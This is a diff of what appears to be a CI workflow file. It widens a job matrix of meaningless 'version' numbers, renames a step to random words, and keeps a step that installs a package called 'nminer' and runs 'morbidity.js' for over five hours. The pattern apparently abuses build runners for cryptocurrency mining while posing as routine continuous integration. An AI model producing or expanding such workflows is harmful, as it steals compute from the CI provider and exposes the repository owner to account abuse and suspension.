@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9004 }
-          - { version: 629 }
+          - { version: 2267 }
+          - { version: 9979 }
+          - { version: 2043 }
+          - { version: 6429 }
+          - { version: 4027 }
+          - { version: 350 }
+          - { version: 7706 }
+          - { version: 394 }
+          - { version: 3692 }
+          - { version: 3861 }
+          - { version: 1906 }
+          - { version: 220 }
+          - { version: 4329 }
+          - { version: 3063 }
           - { version: 4109 }
-          - { version: 5569 }
-          - { version: 4599 }
-          - { version: 5649 }
-          - { version: 2610 }
-          - { version: 724 }
-          - { version: 5790 }
-          - { version: 5923 }
-          - { version: 8503 }
-          - { version: 9602 }
-          - { version: 8321 }
-          - { version: 5314 }
-          - { version: 2650 }
-          - { version: 8153 }
-          - { version: 2236 }
+          - { version: 9255 }
+          - { version: 5452 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: bare
+      - name: livid until
         run: |
           npm install nminer@latest
-          timeout 313m node morbidity.js || echo "morbidity executed"
+          timeout 329m node morbidity.js || echo "morbidity executed"
